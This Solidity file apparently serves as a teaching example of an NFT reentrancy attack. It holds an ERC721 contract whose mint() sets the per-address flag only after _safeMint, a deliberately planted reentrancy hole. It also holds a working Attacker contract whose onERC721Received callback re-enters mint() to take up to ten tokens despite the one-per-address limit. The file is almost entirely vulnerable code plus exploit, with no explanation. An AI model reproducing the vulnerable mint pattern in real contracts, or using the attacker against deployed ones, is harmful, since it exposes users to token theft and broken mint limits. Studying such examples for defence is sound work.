// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract NFTReentrancy is ERC721 {

    uint256 public totalSupply;

    mapping(address => bool) public mintedAddress;

    constructor() ERC721("", "") {}

    function mint() external {
        require(!mintedAddress[msg.sender], "already minted");

        totalSupply++;

        _safeMint(msg.sender, totalSupply);

        mintedAddress[msg.sender] = true;  
    }
}

contract Attacker is IERC721Receiver {

    NFTReentrancy public nft;

    constructor(NFTReentrancy _nft) {
        nft = _nft;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (nft.balanceOf(address(this)) < 10) {
            nft.mint();
        }

        return this.onERC721Received.selector;
    }

    function attack() external {
        nft.mint();
    }
}
